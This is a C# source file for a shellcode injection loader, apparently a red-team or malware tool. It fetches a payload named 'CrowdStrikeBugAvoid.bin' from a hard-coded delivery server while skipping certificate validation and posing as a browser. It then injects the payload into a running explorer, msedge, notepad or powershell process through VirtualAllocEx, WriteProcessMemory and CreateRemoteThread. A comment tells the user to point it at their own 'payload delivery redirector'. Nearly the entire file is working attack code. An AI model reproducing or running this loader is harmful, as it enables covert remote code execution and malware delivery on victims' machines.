using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Management.Automation;

namespace remoteProc
{


    internal class Program
    {
        // APIs
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(
            ulong dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId
            );

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            ulong flAllocationType,
            ulong flProtect
            );
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out int lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out int lpThreadId
    );

        public enum State
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000
        }

        public enum Protection
        {
            PAGE_EXECUTE_READWRITE = 0x40
        }
        public enum Proc
        {
            PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ = 0x0010,
            PROCESS_VM_WRITE = 0x0020
        }

        public static void runit(int id)
        {
            string url = "http://192.168.1.6:8000/CrowdStrikeBugAvoid.bin";// change this ip to you payload delivery redirector
            WebClient wc = new WebClient();
            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            byte[] buf = wc.DownloadData(url);
           
            int bytesWritten = 0;
            uint dwStackSize = 0;
            //const uint CREATE_SUSPENDED = 0x00000004;
            const uint dwCreationFlags = 0;
            var desiredAccess = Proc.PROCESS_CREATE_THREAD | Proc.PROCESS_QUERY_INFORMATION | Proc.PROCESS_VM_OPERATION | Proc.PROCESS_VM_READ | Proc.PROCESS_VM_WRITE;
            int buf_size = buf.Length;

            IntPtr hProcess = OpenProcess((ulong)desiredAccess, true, id);
            IntPtr startMem = VirtualAllocEx(hProcess, IntPtr.Zero, buf_size, (ulong)State.MEM_COMMIT | (ulong)State.MEM_RESERVE, (ulong)Protection.PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(hProcess, startMem, buf, buf_size, out bytesWritten);
            CreateRemoteThread(hProcess, IntPtr.Zero, dwStackSize, startMem, IntPtr.Zero, dwCreationFlags, out id);


            //VirtualFreeEx(hProcess, startMem, buf_size, MEM_DECOMMIT);




        }
        public static  void ListProcesses()
        {
            string[] targetProcesses = { "explorer", "msedge", "notepad", "powershell" }; // You ca add or modify proc

            Process[] processCollection = Process.GetProcesses();

            foreach (Process p in processCollection)
            {
                if (Array.Exists(targetProcesses, processName => processName.Equals(p.ProcessName, StringComparison.OrdinalIgnoreCase)))
                {
                    int nameid = p.Id;
                    if (nameid != 0)
                    {
                        Console.WriteLine($"{p.ProcessName} == {nameid}");

                        //Program ru = new Program();
                        //ru.runit(nameid);
                        runit(nameid);

                        // delete me plzz :)
                        Console.WriteLine($"############################## {nameid} ##############################");

                        break;

                    }

                }
            }
        }

        static void Main(string[] args)
        {
            // calling ListProcesses method
            //Program lp = new Program();
            ListProcesses();
        }
    }
}